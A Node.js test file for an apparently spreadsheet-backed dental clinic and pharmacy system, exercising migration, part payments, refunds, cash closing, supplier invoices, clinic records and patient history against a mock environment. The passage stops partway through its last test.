// v3.1 backend tests: money (part payments, collections, returns/refunds, cash closing),
// suppliers + purchase invoices, clinic records, reports, health check, restore drill.
//   node --test tests/backend-v31.test.js
'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { createGas, legacyData } = require('./gas-mock');

const SS = '1rOwubjghrsuWiGXR8X1A1841_8yd-cmMQIj44QBqNaA';
const OWNER_PW = 'Clinic#Owner2026', STAFF_PW = 'Reception#2026';

function data31() {
  const d = legacyData();
  // an old bill (outside a short loading window) + a purchase from a second supplier
  d.Bills.push(['BILL-1600000000001', 'Old Patient', 'Dr. T. Venkat Rao', '9000011111', '2025-06-01', 30, 0, 30, 12, 'Cash', '2025-06-01 10:00:00']);
  d.BillItems.push(['BILL-1600000000001', 1001, 'Paracetamol 500mg', 3, 10, 4, 30, '2025-06-01 10:00:00']);
  d.Purchases.push(['PUR-2', '2026-09-15', 'Medi Distributors', 1002, 'Amoxicillin 500mg', 40, 12, 480, '2026-09-15 10:00:00']);
  d.Patients.push(['PT-2', 'Lakshmi', '9123456780', '29', 'F', 'Dr. T. Sai Vakula', '', 500, 'Penicillin allergy', 'Active', '2026-10-02', '2026-10-02']);
  return d;
}
function setup(opts = {}) {
  const g = createGas(); g.addSpreadsheet(SS, data31());
  g.run('migrateToV3');
  const temp = {}; g.logs.join('\n').replace(/(owner|staff)\s*:\s*(\S+)/g, (_, u, p) => { temp[u] = p; });
  if (opts.v31 !== false) g.run('migrateToV31');
  const login = (u, p) => g.post({ action: 'login', username: u, password: p });
  let o = login('owner', temp.owner); assert.equal(o.success, true, JSON.stringify(o));
  assert.equal(g.post({ action: 'changePassword', token: o.token, oldPassword: temp.owner, newPassword: OWNER_PW }).success, true);
  let s = login('staff', temp.staff);
  assert.equal(g.post({ action: 'changePassword', token: s.token, oldPassword: temp.staff, newPassword: STAFF_PW }).success, true);
  const owner = (b) => g.post(Object.assign({ token: o.token }, b));
  const staff = (b) => g.post(Object.assign({ token: s.token }, b));
  const sheet = (n) => g.spreadsheets[SS].getSheetByName(n);
  const rows = (n) => sheet(n).rows.filter(r => r && r.some(v => v !== '' && v != null));
  const hdr = (n) => sheet(n).rows[0];
  const col = (n, name) => hdr(n).indexOf(name);
  const all = (who) => who({ action: 'getAllData' });
  const med = (d, id) => d.medicines.find(m => String(m.id) === String(id));
  return { g, temp, login, owner, staff, sheet, rows, hdr, col, all, med, ologin: o, slogin: s };
}
const today = () => new Intl.DateTimeFormat('en-CA', { timeZone: 'Asia/Kolkata' }).format(new Date());
const daysAgo = (n) => new Intl.DateTimeFormat('en-CA', { timeZone: 'Asia/Kolkata' }).format(new Date(Date.now() - n * 86400000));
const item = (medicineId, qty, price, name) => ({ medicineId, medicineName: name || 'x', qty, price, amount: qty * price });
const bill = (id, items, extra) => {
  const sub = items.reduce((a, i) => a + i.qty * i.price, 0);
  return Object.assign({ action: 'saveBill', billId: id, patientName: 'Test Patient', doctor: 'Dr. T. Venkat Rao', phone: '9000000000',
    items: JSON.stringify(items), subtotal: sub.toFixed(2), discount: '0', total: sub.toFixed(2), paymentMode: 'Cash' }, extra || {});
};

// ═════════════════ MIGRATION ═════════════════
test('v3.1 migration: dry run changes nothing; backup first; only adds; old bills paid in full; suppliers + price list; re-runnable', () => {
  const g = createGas(); g.addSpreadsheet(SS, data31()); g.run('migrateToV3');
  assert.throws(() => { const g2 = createGas(); g2.addSpreadsheet(SS, data31()); g2.run('migrateToV31'); }, /migrateToV3 first/);
  const snap = () => JSON.stringify(g.spreadsheets[SS].sheets.map(s => [s.name, s.rows]));
  const before = snap();
  g.run('migrateToV31DryRun');
  assert.equal(snap(), before, 'dry run must not write');
  const log = g.logs.join('\n');
  assert.match(log, /Mark 3 existing bill\(s\) as paid in full/);
  assert.match(log, /Create 2 supplier\(s\) from purchase history: Sai Pharma, Medi Distributors/);
  const v30 = JSON.parse(before);
  g.run('migrateToV31');
  assert.equal(Object.values(g.driveFiles).filter(f => /pre-migration/.test(f.name)).length, 2, 'a second verified backup before v3.1');
  // every pre-existing cell is unchanged
  for (const [name, rws] of v30) {
    const sh = g.spreadsheets[SS].getSheetByName(name);
    rws.forEach((row, r) => (row || []).forEach((v, c) => assert.deepEqual(sh.rows[r][c], v, `${name}!R${r + 1}C${c + 1} changed`)));
  }
  const bills = g.spreadsheets[SS].getSheetByName('Bills'), h = bills.rows[0];
  bills.rows.slice(1).forEach(r => { assert.equal(r[h.indexOf('Paid Amount')], r[7]); assert.equal(r[h.indexOf('Balance Due')], 0); assert.equal(r[h.indexOf('Payment Status')], 'Paid'); });
  const sup = g.spreadsheets[SS].getSheetByName('Suppliers').rows.slice(1).filter(r => r[0]);
  assert.deepEqual(sup.map(r => r[1]).sort(), ['Medi Distributors', 'Sai Pharma']);
  const pur = g.spreadsheets[SS].getSheetByName('Purchases'), ph = pur.rows[0];
  pur.rows.slice(1).forEach(r => assert.ok(r[ph.indexOf('Supplier ID')], 'purchase linked to supplier'));
  assert.equal(g.spreadsheets[SS].getSheetByName('TreatmentMaster').rows.slice(1).filter(r => r[0]).length, 18);
  assert.equal(g.props.SCHEMA_VERSION, '4');
  assert.ok(g.props.LOCAL_KEY_SECRET && g.props.LOCAL_KEY_SECRET.length >= 64);
  g.run('migrateToV31');      // re-run: nothing duplicated
  assert.equal(g.spreadsheets[SS].getSheetByName('Suppliers').rows.slice(1).filter(r => r[0]).length, 2);
  assert.equal(g.spreadsheets[SS].getSheetByName('TreatmentMaster').rows.slice(1).filter(r => r[0]).length, 18);
});

test('before migrateToV31: app keeps working, new actions say so; no part payments; no device key', () => {
  const t = setup({ v31: false });
  assert.equal(t.ologin.features.v31, false); assert.equal(t.ologin.dataKey, '');
  assert.equal(t.owner({ action: 'recordPayment', againstType: 'BILL', againstId: 'x', amount: 1 }).code, 'MIGRATION_REQUIRED');
  const r = t.staff(bill('BILL-7000000000001', [item(1001, 2, 10)], { paidAmount: 5 }));
  assert.equal(r.success, false); assert.match(r.error, /v3\.1 server update/);
  assert.equal(t.staff(bill('BILL-7000000000002', [item(1001, 2, 10)])).success, true, 'normal bills still fine');
  const d = t.all(t.owner); assert.equal(d.features.v31, false); assert.equal(d.receivables, undefined);
});

test('device data key: per user, stable, never the same for owner and staff', () => {
  const t = setup();
  assert.match(t.ologin.dataKey, /^[A-Za-z0-9+/]{43}=$/);
  assert.notEqual(t.ologin.dataKey, t.slogin.dataKey);
  assert.equal(t.owner({ action: 'whoami' }).dataKey, t.ologin.dataKey);
  assert.equal(t.login('owner', OWNER_PW).dataKey, t.ologin.dataKey, 'same key at next login (encrypted cache stays readable)');
  assert.equal(t.ologin.features.v31, true);
});

// ═════════════════ PART PAYMENTS + COLLECTIONS ═════════════════
test('part payment: balance due, receivable, staff collects the rest, over-collection refused, numbering', () => {
  const t = setup();
  const r = t.staff(bill('BILL-8000000000001', [item(1001, 5, 10)], { paidAmount: 30, patientName: 'Ravi Kumar', phone: '98765 43210' }));
  assert.equal(r.success, true, r.error); assert.equal(r.paidAmount, 30); assert.equal(r.balanceDue, 20);
  let d = t.all(t.staff);
  const b = d.bills.find(x => x.billId === 'BILL-8000000000001');
  assert.equal(b.paymentStatus, 'Partial'); assert.equal(b.balanceDue, 20); assert.equal(b.cashAmount, 30);
  assert.equal(b.patientId, 'PT-1', 'linked to the saved patient by name + phone');
  const rec = d.receivables.find(x => x.id === 'BILL-8000000000001'); assert.equal(rec.balance, 20);
  assert.ok(d.receivables.find(x => x.type === 'OPENING' && x.id === 'PT-2' && x.balance === 500), 'old patient balance is a receivable');

  const over = t.staff({ action: 'recordPayment', againstType: 'BILL', againstId: 'BILL-8000000000001', amount: 25, mode: 'Cash' });
  assert.equal(over.success, false); assert.match(over.error, /Only ₹20 is due/);
  const p1 = t.staff({ action: 'recordPayment', againstType: 'BILL', againstId: 'BILL-8000000000001', amount: 15, mode: 'UPI', ref: 'UPI1' });
  assert.equal(p1.success, true); assert.equal(p1.balance, 5); assert.match(p1.paymentNo, /^PAY-\d\d-00001$/);
  const p2 = t.staff({ action: 'recordPayment', againstType: 'BILL', againstId: 'BILL-8000000000001', amount: 5, mode: 'Split', cashAmount: 2, upiAmount: 3 });
  assert.equal(p2.success, true); assert.equal(p2.balance, 0); assert.match(p2.paymentNo, /00002$/);
  d = t.all(t.owner);
  assert.equal(d.bills.find(x => x.billId === 'BILL-8000000000001').paymentStatus, 'Paid');
  assert.ok(!d.receivables.find(x => x.id === 'BILL-8000000000001'));
  assert.equal(d.payments.filter(p => p.againstId === 'BILL-8000000000001').length, 2);
  assert.equal(t.staff({ action: 'recordPayment', againstType: 'BILL', againstId: 'BILL-8000000000001', amount: 1, mode: 'Cash' }).success, false, 'nothing due');
  // old balance collected
  const ob = t.staff({ action: 'recordPayment', againstType: 'OPENING', againstId: 'PT-2', amount: 200, mode: 'Cash' });
  assert.equal(ob.balance, 300);
  assert.equal(t.all(t.owner).patients.find(p => p.id === 'PT-2').balance, 300);
  assert.equal(t.owner({ action: 'validateData' }).count, 0, JSON.stringify(t.owner({ action: 'validateData' }).issues));
});

test('pay later (credit), split part payment rules, owner can switch off staff credit', () => {
  const t = setup();
  const c = t.staff(bill('BILL-8000000000011', [item(1001, 2, 10)], { paymentMode: 'Credit' }));
  assert.equal(c.success, true); assert.equal(c.paidAmount, 0); assert.equal(c.balanceDue, 20);
  assert.equal(t.all(t.owner).bills.find(b => b.billId === 'BILL-8000000000011').paymentStatus, 'Unpaid');
  const bad = t.staff(bill('BILL-8000000000012', [item(1001, 2, 10)], { paymentMode: 'Split', paidAmount: 15, cashAmount: 5, upiAmount: 5 }));
  assert.match(bad.error, /add up to the amount paid now/);
  assert.equal(t.staff(bill('BILL-8000000000013', [item(1001, 2, 10)], { paymentMode: 'Split', paidAmount: 15, cashAmount: 10, upiAmount: 5 })).success, true);
  assert.match(t.staff(bill('BILL-8000000000014', [item(1001, 2, 10)], { paidAmount: 25 })).error, /between ₹0 and the total/);
  assert.equal(t.owner({ action: 'saveSettings', settingKey: 'staff_credit_allowed', settingValue: 'no' }).success, true);
  assert.match(t.staff(bill('BILL-8000000000015', [item(1001, 2, 10)], { paidAmount: 5 })).error, /Only the owner/);
  assert.equal(t.owner(bill('BILL-8000000000016', [item(1001, 2, 10)], { paidAmount: 5 })).success, true, 'owner still can');
  assert.equal(t.all(t.staff).settings.staffCreditAllowed, false);
});

test('dental receipt part payment + collection; old app (no paidAmount) still means paid in full', () => {
  const t = setup();
  const r = t.staff({ action: 'saveTreatmentReceipt', recordId: 'TR-1', receiptNo: '2026-0100', date: today(), patient: 'Ravi Kumar', phone: '9876543210', doctor: 'Dr. T. Venkat Rao',
    amount: '5000', amountWords: 'Five thousand', treatments: 'Root Canal Treatment', paymentMode: 'UPI', paidAmount: 2000 });
  assert.equal(r.success, true, r.error); assert.equal(r.balanceDue, 3000);
  const old = t.staff({ action: 'saveTreatmentReceipt', recordId: 'TR-2', receiptNo: '2026-0101', date: today(), patient: 'Lakshmi', amount: '800', treatments: 'Scaling', paymentMode: 'Cash' });
  assert.equal(old.success, true); assert.equal(old.balanceDue, 0);
  let d = t.all(t.staff);
  const tr = d.treatmentReceipts.find(x => x.recordId === 'TR-1');
  assert.equal(tr.paymentStatus, 'Partial'); assert.equal(tr.upiAmount, 2000); assert.equal(tr.patientId, 'PT-1');
  assert.equal(d.receivables.find(x => x.id === 'TR-1').phone, '9876543210', 'phone filled from the patient record');
  assert.equal(t.staff({ action: 'recordPayment', againstType: 'RECEIPT', againstId: 'TR-1', amount: 3000, mode: 'Cash' }).balance, 0);
  d = t.all(t.owner);
  assert.equal(d.treatmentReceipts.find(x => x.recordId === 'TR-1').paymentStatus, 'Paid');
  assert.equal(t.owner({ action: 'validateData' }).count, 0);
});

test('cancel a collection (owner only, reason) puts the balance back; refunds cannot be cancelled', () => {
  const t = setup();
  t.staff(bill('BILL-8000000000021', [item(1001, 3, 10)], { paidAmount: 10 }));
  const p = t.staff({ action: 'recordPayment', againstType: 'BILL', againstId: 'BILL-8000000000021', amount: 20, mode: 'Cash' });
  assert.equal(t.staff({ action: 'cancelPayment', paymentId: p.paymentId, reason: 'typed twice' }).code, 'FORBIDDEN');
  assert.match(t.owner({ action: 'cancelPayment', paymentId: p.paymentId, reason: '' }).error, /reason/);
  assert.equal(t.owner({ action: 'cancelPayment', paymentId: p.paymentId, reason: 'typed twice' }).success, true);
  const b = t.all(t.owner).bills.find(x => x.billId === 'BILL-8000000000021');
  assert.equal(b.balanceDue, 20); assert.equal(b.paymentStatus, 'Partial');
  assert.equal(t.owner({ action: 'cancelBill', billId: 'BILL-8000000000021', reason: 'test' }).success, true, 'cancel ok once the later payment is cancelled');
});

// ═════════════════ RETURNS + REFUNDS ═════════════════
test('return: stock back to the same batch, money back = overpayment, cost reversed; limits enforced', () => {
  const t = setup();
  t.owner(bill('BILL-8000000000031', [item(1001, 4, 10), item(1002, 2, 25)], { discount: '9', total: '81' }));   // 90 − 10% = 81
  const batch1001 = t.rows('Batches').find(r => String(r[1]) === '1001').slice();
  const before = t.med(t.all(t.owner), 1001).stock;
  assert.equal(t.staff({ action: 'returnRefund', againstType: 'BILL', againstId: 'BILL-8000000000031', items: JSON.stringify([{ medicineId: '1001', qty: 1 }]), reason: 'x' }).code, 'FORBIDDEN');
  assert.match(t.owner({ action: 'returnRefund', againstType: 'BILL', againstId: 'BILL-8000000000031', items: JSON.stringify([{ medicineId: '1001', qty: 5 }]), reason: 'wrong strip' }).error, /Only 4/);
  const r = t.owner({ action: 'returnRefund', againstType: 'BILL', againstId: 'BILL-8000000000031', items: JSON.stringify([{ medicineId: '1001', qty: 2 }]), reason: 'Doctor changed medicine', mode: 'Cash' });
  assert.equal(r.success, true, r.error);
  assert.equal(r.creditValue, 18, '2 × ₹10 less the 10% bill discount'); assert.equal(r.refundAmount, 18); assert.equal(r.costReversed, 8); assert.match(r.refundNo, /^RF-\d\d-00001$/);
  assert.equal(t.med(t.all(t.owner), 1001).stock, before + 2);
  assert.equal(t.rows('Batches').find(x => x[0] === batch1001[0])[5], batch1001[5] + 2, 'back into the batch it was sold from');
  assert.ok(t.rows('StockMovements').some(m => m[6] === 'CUSTOMER_RETURN' && m[5] === 2));
  assert.match(t.owner({ action: 'returnRefund', againstType: 'BILL', againstId: 'BILL-8000000000031', items: JSON.stringify([{ medicineId: '1001', qty: 3 }]), reason: 'again' }).error, /Only 2 of Paracetamol/);
  const b = t.all(t.owner).bills.find(x => x.billId === 'BILL-8000000000031');
  assert.equal(b.returnedValue, 18); assert.equal(b.refundedAmount, 18); assert.equal(b.balanceDue, 0);
  assert.match(t.owner({ action: 'cancelBill', billId: 'BILL-8000000000031', reason: 'x y z' }).error, /Return \/ Refund/);
  assert.equal(t.owner({ action: 'validateData' }).count, 0, JSON.stringify(t.owner({ action: 'validateData' }).issues));
});

test('return on an unpaid balance reduces what is owed first; allowance; damaged goods not restocked', () => {
  const t = setup();
  t.owner(bill('BILL-8000000000041', [item(1001, 10, 10)], { paidAmount: 40 }));            // owes 60
  const stock = t.med(t.all(t.owner), 1001).stock;
  const r = t.owner({ action: 'returnRefund', againstType: 'BILL', againstId: 'BILL-8000000000041', items: JSON.stringify([{ medicineId: '1001', qty: 3 }]), restock: false, reason: 'strips damaged' });
  assert.equal(r.success, true, r.error); assert.equal(r.refundAmount, 0, 'nothing paid back — the balance just goes down'); assert.equal(r.balance, 30); assert.equal(r.costReversed, 0);
  assert.equal(t.med(t.all(t.owner), 1001).stock, stock, 'not put back in stock');
  const r2 = t.owner({ action: 'returnRefund', againstType: 'BILL', againstId: 'BILL-8000000000041', allowance: 50, reason: 'goodwill', mode: 'UPI' });
  assert.equal(r2.refundAmount, 20, 'net 100−30−50 = 20, paid 40 → 20 back'); assert.equal(r2.balance, 0);
  assert.match(t.owner({ action: 'returnRefund', againstType: 'BILL', againstId: 'BILL-8000000000041', allowance: 30, reason: 'too much' }).error, /more than the bill total/);
  const rcpt = t.staff({ action: 'saveTreatmentReceipt', recordId: 'TR-9', receiptNo: 'R9', patient: 'A', amount: '1000', paymentMode: 'Cash' });
  assert.equal(rcpt.success, true);
  const r3 = t.owner({ action: 'returnRefund', againstType: 'RECEIPT', againstId: 'TR-9', allowance: 200, reason: 'treatment not done', mode: 'Cash' });
  assert.equal(r3.refundAmount, 200);
  assert.equal(t.owner({ action: 'cancelPayment', paymentId: r3.refundId, reason: 'oops' }).success, false);
  assert.equal(t.owner({ action: 'validateData' }).count, 0);
});

// ═════════════════ CASH CLOSING ═════════════════
test('cash closing: expected cash from bills, receipts, collections, refunds, expenses, supplier payments', () => {
  const t = setup();
  t.staff(bill('BILL-8000000000051', [item(1001, 10, 10)]));                                  // cash +100
  t.staff(bill('BILL-8000000000052', [item(1001, 5, 10)], { paymentMode: 'UPI' }));           // upi 50
  t.staff(bill('BILL-8000000000053', [item(1001, 5, 10)], { paidAmount: 20 }));               // cash +20
  t.staff({ action: 'recordPayment', againstType: 'BILL', againstId: 'BILL-8000000000053', amount: 30, mode: 'Cash' });   // cash +30
  t.staff({ action: 'saveTreatmentReceipt', recordId: 'TR-C1', patient: 'B', amount: '500', paymentMode: 'Split', paidAmount: 500, cashAmount: 200, upiAmount: 300 }); // cash +200, upi 300
  t.owner({ action: 'returnRefund', againstType: 'BILL', againstId: 'BILL-8000000000051', items: JSON.stringify([{ medicineId: '1001', qty: 1 }]), reason: 'return', mode: 'Cash' }); // cash −10
  t.owner({ action: 'saveExpense', id: 'EXP-C1', date: today(), category: 'Tea', amount: 40, mode: 'Cash' });                 // cash −40
  const sup = t.all(t.owner).suppliers[0];
  t.owner({ action: 'recordSupplierPayment', supplierId: sup.id, amount: 100, mode: 'Cash' });                                 // cash −100
  const s = t.staff({ action: 'getCashSummary' });
  assert.equal(s.success, true, s.error);
  assert.equal(s.summary.cashIn, 350); assert.equal(s.summary.cashOut, 150); assert.equal(s.summary.upiIn, 350);
  const c = t.staff({ action: 'saveCashClosing', openingCash: 1000, countedCash: 1195, deposited: 1000, upiVerified: true, notes: '₹5 short' });
  assert.equal(c.success, true, c.error); assert.equal(c.expectedCash, 1200); assert.equal(c.difference, -5);
  assert.match(t.staff({ action: 'saveCashClosing', openingCash: 1000, countedCash: 1200 }).error, /already closed/);
  assert.equal(t.owner({ action: 'saveCashClosing', openingCash: 1000, countedCash: 1200, deposited: 1000 }).difference, 0, 'owner can correct');
  const list = t.owner({ action: 'getCashClosings' }).closings;
  assert.equal(list.length, 1, 'the corrected closing replaces the first'); assert.equal(list[0].countedCash, 1200);
  // a past day: staff limited to recent days
  assert.equal(t.staff({ action: 'getCashSummary', date: daysAgo(10) }).code, 'FORBIDDEN');
});

test('cash closing: next day suggests yesterday counted − deposited as opening', () => {
  const t = setup();
  assert.equal(t.owner({ action: 'saveCashClosing', date: daysAgo(1), openingCash: 500, countedCash: 2500, deposited: 2000 }).success, true);
  assert.equal(t.staff({ action: 'getCashSummary' }).suggestedOpening, 500);
});

// ═════════════════ SUPPLIERS + PURCHASE INVOICES ═════════════════
test('purchase invoice: many lines, free qty, round-off spread into batch cost, ledger + paid now, duplicate blocked', () => {
  const t = setup();
  assert.equal(t.staff({ action: 'addPurchaseInvoice', supplierName: 'X', lines: '[]' }).code, 'FORBIDDEN');
  const sp = t.owner({ action: 'saveSupplier', name: 'Sri Venkateswara Pharma', phone: '9988776655' });
  assert.equal(sp.success, true);
  assert.equal(t.owner({ action: 'saveSupplier', name: 'sri venkateswara pharma' }).code, 'DUPLICATE');
  const lines = [{ medicineId: '1001', qty: 100, freeQty: 10, costPrice: 4, mrp: 12, batchNo: 'PC2611', expiry: '2028-03-31' },
                 { medicineId: '1003', qty: 10, costPrice: 70, batchNo: 'CHX9', expiry: '2027-12-31' }];
  const before = t.all(t.owner);
  const r = t.owner({ action: 'addPurchaseInvoice', id: 'PINV-T1', supplierId: sp.id, invoiceNo: 'SV/1203', date: today(), lines: JSON.stringify(lines), adjustment: -11, paidAmount: 500, paymentMode: 'UPI' });
  assert.equal(r.success, true, r.error); assert.equal(r.total, 1089); assert.equal(r.due, 589);
  const d = t.all(t.owner);
  assert.equal(t.med(d, 1001).stock, t.med(before, 1001).stock + 110);
  assert.equal(t.med(d, 1003).stock, 10);
  const b = t.rows('Batches').find(x => x[2] === 'PC2611');
  assert.equal(b[6], 3.6, 'cost per unit = 400 × (1089/1100) / 110 units');
  assert.equal(t.rows('Purchases').filter(p => p[t.col('Purchases', 'Invoice ID')] === 'PINV-T1').length, 2);
  const s = d.suppliers.find(x => x.id === sp.id); assert.equal(s.balance, 589); assert.equal(s.purchases, 1089); assert.equal(s.payments, 500);
  assert.equal(t.owner({ action: 'addPurchaseInvoice', id: 'PINV-T1', supplierId: sp.id, lines: JSON.stringify(lines) }).duplicate, true, 'same request again → no double stock');
  assert.equal(t.owner({ action: 'addPurchaseInvoice', id: 'PINV-T2', supplierId: sp.id, invoiceNo: 'sv/1203', lines: JSON.stringify(lines) }).code, 'DUPLICATE');
  assert.match(t.owner({ action: 'addPurchaseInvoice', supplierId: sp.id, lines: JSON.stringify([{ medicineId: '1001', qty: 5, costPrice: 4, expiry: '2020-01-01' }]) }).error, /already expired/);
  assert.match(t.owner({ action: 'addPurchaseInvoice', supplierId: sp.id, lines: JSON.stringify([{ medicineId: '1001', qty: 1.5, costPrice: 4 }]) }).error, /invalid quantity/);
  assert.match(t.owner({ action: 'addPurchaseInvoice', supplierId: sp.id, lines: JSON.stringify(lines), paidAmount: 5000 }).error, /between ₹0 and the invoice total/);
  // pay the supplier, return 5 strips, ledger running balance
  assert.equal(t.owner({ action: 'recordSupplierPayment', supplierId: sp.id, amount: 89, mode: 'Cash' }).balance, 500);
  const ret = t.owner({ action: 'purchaseReturn', supplierId: sp.id, medicineId: '1001', batchId: b[0], qty: 5, reason: 'damaged boxes' });
  assert.equal(ret.success, true, ret.error); assert.equal(ret.amount, 18);
  const led = t.owner({ action: 'getSupplierLedger', supplierId: sp.id });
  assert.deepEqual(led.entries.map(e => [e.type, e.balanceAfter]), [['PURCHASE', 1089], ['PAYMENT', 589], ['PAYMENT', 500], ['RETURN', 482]]);
  assert.equal(led.supplier.balance, 482);
  // cancel: blocked once anything from it was sold/returned; a clean invoice can be cancelled
  assert.match(t.owner({ action: 'cancelPurchaseInvoice', id: 'PINV-T1', reason: 'entered wrong' }).error, /already sold\/used/);
  const r2 = t.owner({ action: 'addPurchaseInvoice', id: 'PINV-T3', supplierName: 'New Supplier Co', invoiceNo: 'N1', lines: JSON.stringify([{ medicineId: '1002', qty: 20, costPrice: 11 }]) });
  assert.equal(r2.success, true); assert.equal(r2.due, 220);
  assert.ok(t.all(t.owner).suppliers.find(x => x.name === 'New Supplier Co'), 'typed supplier created');
  const st = t.med(t.all(t.owner), 1002).stock;
  assert.equal(t.owner({ action: 'cancelPurchaseInvoice', id: 'PINV-T3', reason: 'duplicate entry' }).success, true);
  const d2 = t.all(t.owner);
  assert.equal(t.med(d2, 1002).stock, st - 20);
  assert.equal(d2.suppliers.find(x => x.name === 'New Supplier Co').balance, 0, 'ledger entries of a cancelled invoice no longer count');
  assert.equal(t.owner({ action: 'validateData' }).count, 0, JSON.stringify(t.owner({ action: 'validateData' }).issues));
});

test('invoice attachment: photo/PDF saved to Drive and linked; bad type/size refused', () => {
  const t = setup();
  t.owner({ action: 'addPurchaseInvoice', id: 'PINV-A1', supplierName: 'Sai Pharma', invoiceNo: 'SP-9', lines: JSON.stringify([{ medicineId: '1001', qty: 10, costPrice: 4 }]) });
  const pdf = Buffer.from('%PDF-1.4 test').toString('base64');
  assert.match(t.owner({ action: 'uploadInvoiceAttachment', invoiceId: 'PINV-A1', mimeType: 'text/html', data: pdf }).error, /Only photos/);
  assert.match(t.owner({ action: 'uploadInvoiceAttachment', invoiceId: 'PINV-A1', mimeType: 'application/pdf', data: 'x'.repeat(7000001) }).error, /too large/);
  const r = t.owner({ action: 'uploadInvoiceAttachment', invoiceId: 'PINV-A1', mimeType: 'application/pdf', data: 'data:application/pdf;base64,' + pdf });
  assert.equal(r.success, true, r.error);
  const f = Object.values(t.g.driveFiles).find(x => x.folder === 'SSDC Purchase Invoices');
  assert.ok(f && /Sai Pharma SP-9/.test(f.name) && /\.pdf$/.test(f.name));
  assert.equal(t.all(t.owner).purchaseInvoices.find(i => i.id === 'PINV-A1').attachmentUrl, r.url);
});

// ═════════════════ CLINIC ═════════════════
test('treatment price list, patient treatments (staff), follow-ups, medical history kept when an old app saves', () => {
  const t = setup();
  const d0 = t.all(t.staff);
  const rct = d0.treatmentMaster.find(x => x.name === 'Root Canal Treatment');
  assert.equal(t.staff({ action: 'saveTreatment', id: rct.id, name: 'Root Canal Treatment', price: 4500 }).code, 'FORBIDDEN');
  assert.equal(t.owner({ action: 'saveTreatment', id: rct.id, name: 'Root Canal Treatment', category: 'Endodontics', price: 4500 }).success, true);
  assert.equal(t.owner({ action: 'saveTreatment', name: 'root canal treatment', price: 1 }).code, 'DUPLICATE');
  const pt = t.staff({ action: 'savePatientTreatment', id: 'PTR-1', patientId: 'PT-1', patientName: 'Ravi Kumar', phone: '9876543210', doctor: 'Dr. T. Venkat Rao', treatmentId: rct.id, tooth: '36', status: 'Planned' });
  assert.equal(pt.success, true, pt.error);
  let d = t.all(t.staff);
  const rec = d.patientTreatments.find(x => x.id === 'PTR-1'); assert.equal(rec.price, 4500, 'price from the price list'); assert.equal(rec.treatment, 'Root Canal Treatment');
  assert.equal(t.staff({ action: 'setPatientTreatmentStatus', id: 'PTR-1', status: 'Completed' }).success, true);
  assert.equal(t.all(t.staff).patientTreatments.find(x => x.id === 'PTR-1').completedOn, today());
  assert.equal(t.staff({ action: 'deletePatientTreatment', id: 'PTR-1' }).code, 'FORBIDDEN');
  // follow-ups
  assert.match(t.staff({ action: 'saveFollowUp', id: 'FU-1', patientName: 'Ravi Kumar' }).error, /follow-up date/);
  assert.equal(t.staff({ action: 'saveFollowUp', id: 'FU-1', patientName: 'Ravi Kumar', phone: '9876543210', dueDate: daysAgo(-7), reason: 'RCT review', source: 'Treatment' }).success, true);
  assert.equal(t.all(t.staff).followUps.find(f => f.id === 'FU-1').patientId, 'PT-1');
  assert.equal(t.staff({ action: 'setFollowUpStatus', id: 'FU-1', status: 'Done' }).success, true);
  assert.equal(t.all(t.staff).followUps.find(f => f.id === 'FU-1').doneBy, 'staff');
  // medical history saved; an older app version that doesn't send these fields keeps them
  assert.equal(t.staff({ action: 'savePatient', id: 'PT-1', name: 'Ravi Kumar', phone: '9876543210', allergies: 'Penicillin', medicalHistory: 'Diabetic (Type 2)', bloodGroup: 'B+' }).success, true);
  assert.equal(t.staff({ action: 'savePatient', id: 'PT-1', name: 'Ravi Kumar', phone: '9876543210', treatment: 'RCT' }).success, true);
  const p = t.all(t.owner).patients.find(x => x.id === 'PT-1');
  assert.equal(p.allergies, 'Penicillin'); assert.equal(p.medicalHistory, 'Diabetic (Type 2)'); assert.equal(p.bloodGroup, 'B+'); assert.equal(p.treatment, 'RCT');
});

test('patient history from the server: bills, receipts, payments, prescriptions, exams, treatments, appointments', () => {
  const t = setup();
  t.staff(bill('BILL-8000000000061', [item(1001, 2, 10)], { patientName: 'Ravi Kumar', phone: '9876543210', paidAmount: 10 }));
  t.staff({ action: 'savePrescription', recordId: 'RX-9', date: today(), patientName: 'Ravi Kumar', age: '34', sex: 'M', prescription: 'Tab Amoxicillin 500 TDS', doctor: 'Dr. T. Venkat Rao', followUpDate: daysAgo(-5) });
  t.staff({ action: 'saveExamForm', recordId: 'EX-9', date: today(), patient: 'Ravi Kumar', phone: '9876543210', final_diag: 'Irreversible pulpitis 36' });
  t.staff({ action: 'savePatientTreatment', id: 'PTR-9', patientName: 'Ravi Kumar', phone: '9876543210', treatment: 'Extraction', price: 800 });
  t.staff(bill('BILL-8000000000062', [item(1001, 1, 10)], { patientName: 'Someone Else', phone: '9000000009' }));
  const h = t.staff({ action: 'getPatientHistory', patientId: 'PT-1' });
  assert.equal(h.success, true, h.error);
  assert.deepEqual(h.bills.map(b => b.billId).sort(), ['BILL-1700000000001', 'BILL-8000000000061'], 'old bill matched by name+phone, new by patient ID');
  assert.equal(h.outstanding, 10);
  assert.equal(h.prescriptions.length, 2, 'old + new prescription'); assert.equal(h.prescriptions[0].followUpDate, daysAgo(-5));
  assert.equal(h.exams[0].final_diag, 'Irreversible pulpitis 36');
  assert.equal(h.treatments[0].treatment, 'Extraction');
  assert.equal(h.receipts.length, 1); assert.equal(h.appointments.length, 1);
  assert.ok(!h.bills[0].costTotal, 'no cost prices for staff');
});

test('server pages: recent prescriptions/exams/receipts with cursor; older bills with getBills', () => {
  const t = setup();
  for (let i = 0; i < 7; i++) t.staff({ action: 'savePrescription', recordId: 'RXP-' + i, date: today(), patientName: 'P' + i, prescription: 'rx ' + i });
  const a = t.staff({ action: 'getRecentRecords', kind: 'prescriptions', limit: 3 });
  assert.deepEqual(a.records.map(r => r.patientName), ['P6', 'P5', 'P4']);
  const b = t.staff({ action: 'getRecentRecords', kind: 'prescriptions', limit: 3, cursor: a.cursor });
  assert.deepEqual(b.records.map(r => r.patientName), ['P3', 'P2', 'P1']);
  assert.deepEqual(t.staff({ action: 'getRecentRecords', kind: 'prescriptions', q: 'p5' }).records.map(r => r.patientName), ['P5']);
  assert.equal(t.owner({ action: 'saveSettings', settingKey: 'load_window_days', settingValue: '60' }).success, true);
  const d = t.all(t.owner);
  assert.ok(!d.bills.find(x => x.billId === 'BILL-1600000000001'), 'old bill not loaded at login');
  assert.equal(d.features.windowDays, 60);
  const older = t.owner({ action: 'getBills', before: d.loadedFrom, limit: 10 });
  assert.deepEqual(older.bills.map(x => x.billId), ['BILL-1600000000001']);
  assert.equal(older.bills[0].costTotal, 12);
